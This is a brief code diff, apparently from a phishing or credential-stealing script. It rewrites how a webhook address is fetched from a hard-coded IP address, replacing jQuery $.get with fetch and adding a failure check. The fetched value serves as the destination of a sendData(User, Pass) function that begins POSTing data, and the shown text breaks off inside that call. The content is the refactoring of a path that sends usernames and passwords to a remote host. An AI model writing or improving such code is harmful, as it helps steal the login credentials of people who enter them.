@@ -1,5 +1,11 @@
 
-var webhook = $.get('http://70.95.197.6', null, console.log("Status: " + status), "text")
+const response = await fetch('http://70.95.197.6');
+
+if (!response.ok) {
+    console.log("it failed")
+}
+
+const webhook = await response.text();
 function sendData(User, Pass) {
     $.post(webhook,
     {
